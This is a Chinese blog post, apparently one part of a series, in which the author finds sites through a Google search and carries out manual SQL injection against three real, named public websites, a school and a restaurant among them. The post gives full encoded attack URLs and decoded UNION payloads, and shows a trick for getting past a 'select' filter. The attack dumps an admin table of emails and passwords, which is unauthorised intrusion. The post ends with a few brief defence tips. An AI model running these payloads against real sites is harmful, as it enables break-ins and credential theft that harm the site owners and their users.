## 计算机病毒与入侵关于SQL注入的研究（三）
### 写在前面
上次我们研究了怎样通过union进行托库，本次我们玩点真的：***利用google搜索引擎进行手动注入***

### 搜索引擎的使用
使用google搜索```inurl:.php?id=MTM=```，这里inurl指的是在url内有后面字符串的网站，后面的id=MTM=是指base64加密后的id=13。查询出来结果如下：
![third1.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third1.png)

我自己经过删选测试，选取了三个网站：
- http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNQ==
- http://www.thzx.net/e/pl/?classid=34&id=1373(一所高中)
- http://www.zaaffran.com/testimonials.php?id=MTM=(一家印度餐厅)

本次就对这三个网站进行破解。
先回顾一下我们上次自己研究的几个破解步骤：
- 测试能否被注入
- 通过union测表段数目
- 通过mysql函数得到数据库的名称
- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称
- 获取想要的数据

***我们借助[http://www1.tc711.com/tool/BASE64.htm](http://www1.tc711.com/tool/BASE64.htm)这个base64工具进行base64加解密***

### 第一个网站的SQL注入
- 测试是否能被注入，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9Mg==)，含义是```id=13 and 1=2```，返回的结果如下图，表明是可以注入的
![third2.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third2.png)

- 通过union测表段数目，这一个就比较无聊了，我们从1到30挨个测（30以上直接放弃，要累死= - =），最后测试出来表段数目是15，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTU=)，含义是```id=13 and 1=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15```，可以看到有九个显示位，显示位很多，就用不到concat()函数了，结果如下图：
![third3.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third3.png)

- 通过mysql函数得到数据库的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsdmVyc2lvbigpLDEyLDEzLDE0LDE1),含义是```id=13 and 1=1 union select 1,database(),3,4,5,6,7,8,9,10,version(),12,13,14,15```，我们可以看到如下图的结果，表明数据库的名称是csearch，版本是4.0.25
![third4.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third4.png)

- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称，访问[http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg](http://www.comresearch.org/serviceDetails.php?id=MTMgYW5kIDE9MSB1bmlvbiBzZWxlY3QgMSwyLDMsdGFibGVfbmFtZSw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUgZnJvbSBpbmZvcm1hdGlvbl9zaGNlbWEg)，含义是```id=13 and 1=1 union select 1,2,3,table_name,5,6,7,8,9,10,11,12,13,14,15 from information_shcema```，结果竟然是没有权限！！！
![third5.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third5.png)

由于第四步发现这个用户没有权限，我决定放弃，盲注猜表名和错误回显法的耗时较长，同时这个网站应该主要是用来搜索，我尝试了没有users表和admins表就放弃了= - =。

### 第二个网站的SQL注入
- 测试能否被注入，访问[http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/](http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/)发现没有问题，继续
![third6.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third6.png)

- 通过union测表段数目，访问[http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/select/*ABC*/1,2,3,4,5](http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/select/*ABC*/1,2,3,4,5)，惊喜地看到了360= - =，网站过滤了select
![third7.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third7.png)
我又查了几下，看到可以这样访问[http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/s/*ABC*/e/*ABC*/l/*ABC*/e/*ABC*/c/*ABC*/t/*ABC*/1,2,3,4,5](http://www.thzx.net/e/pl/?classid=34&id=1373/*ABC*/and/*ABC*/s/*ABC*/e/*ABC*/l/*ABC*/e/*ABC*/c/*ABC*/t/*ABC*/1,2,3,4,5)，这样绕过了select封锁，然而程序一点错误回显也没有
![third8.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third8.png)
好吧，看起来没有漏洞的样子，放弃

### 第三个网站的SQL注入
- 测试能否被注入，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9Mg==)，含义是```id=13 and 1=2```，结果如下，可以发现页面没有显示，证明是可以注入的
![third9.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third9.png)

- 通过union测表段数目，从1到30挨个测试，运气不错，上来直接猜到了是7,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNw==)，结果如下图所示，可以看到有三个显示位
![third10.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third10.png)

- 通过mysql函数得到数据库的名称，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgpLHZlcnNpb24oKSw0LDUsNiw3),含义是```id=14 and 1=2 union select 1,database(),version(),4,5,6,7```，结果如下图，得到数据库的名称是zaaffran_zaaffran，数据库版本是5.5.2
![third11.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third11.png)

- 通过INFORMATION_SCHEMA查询表的名称和表内行的名称,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXM=),含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables```，可以看到五个数据表：
![third12.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third12.png)
这里只有五张表，而且都是系统表，所以我尝试了一下使用order by table_type,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgdGFibGVfdHlwZQ==)，含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by table_type```
![third13.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third13.png)
可以发现报错了，我结合只有五条数据显示判断系统后面加入了limit 5这个子句，所以导致返回错误，因此访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLHRhYmxlX25hbWUsNCw1LDYsNyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgb3JkZXIgYnkgMSM=)，含义是```id=14 and 1=2 union select 1,2,table_name,4,5,6,7 from information_schema.tables order by 1#```，这次显示结果如下，成功了！
![third14.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third14.png)
同时我们搜索到了adminusers表这个敏感的表，我决定对这个表进行查询，访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLGNvbHVtbl9uYW1lLDQsNSw2LDcgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdhZG1pbnVzZXJzJyBvcmRlciBieSAxIw==)，含义是```14 and 1=2 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='adminusers' order by 1#```，可以看到如下图所有的表段
![third15.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third15.png)

- 获取想要的数据,访问[http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==](http://www.zaaffran.com/testimonials.php?id=MTQgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwyLFVzZXJFbWFpbCxVc2VyUGFzc3dvcmQsNSw2LDcgZnJvbSBhZG1pbnVzZXJzIw==),含义是```14 and 1=2 union select 1,2,UserEmail,UserPassword,5,6,7 from adminusers#```,可以看到adminusers表里面的所有数据
![third16.png](http://git.oschina.net/mrbian/ComputerVirus/raw/master/third/images/third16.png)

## 总结
本次我们进行了三次对公共网站的SQL注入，第一次和第二次不是很成功，第三次好歹是拿到数据了，尝试了一下扩大战果：
```select user,password from mysql.user```，失败= - =，估计是没有权限。
select hex(load_file())的方法也是失败，毕竟mysql版本是5.5，安全级别较高，想要load_file()还是很难的。

碰上的坑：注释使用--的时候，后面要带有一个空格

关于怎样规避SQL的一些经验：可以看到第一二次注入失败，一个是因为权限问题，一个是因为Select过滤的问题，这可以给我们一些防范SQL注入的启示：
- 限制死权限，单独搞一个数据库和用户暴露给外界，把查询的范围和权限限制死，你就算可以注入也然并卵，数据没有用啊！
- 直接过滤掉union或者select，不允许传的参数里面带有这个（360的做法）